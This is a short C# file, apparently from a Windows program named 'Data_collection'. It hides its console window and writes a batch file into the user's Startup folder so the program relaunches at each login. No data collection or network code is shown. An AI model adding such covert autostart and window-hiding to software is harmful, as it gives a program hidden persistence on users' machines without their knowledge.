using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Data_collection
{
    static class StartupManager
    {

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool FreeConsole();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void HideConsoleWindow()
        {
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }


        public static void CreateBatStartup()
        {
            try
            {

                string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                using (StreamWriter sw = File.CreateText(Path.Combine(startupFolderPath, "S6Startup.bat")))
                {
                    sw.WriteLine("@echo off");
                    sw.WriteLine($"start \"\" \"{System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName}\"");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка: {ex.Message}");
            }
        }
    }
}
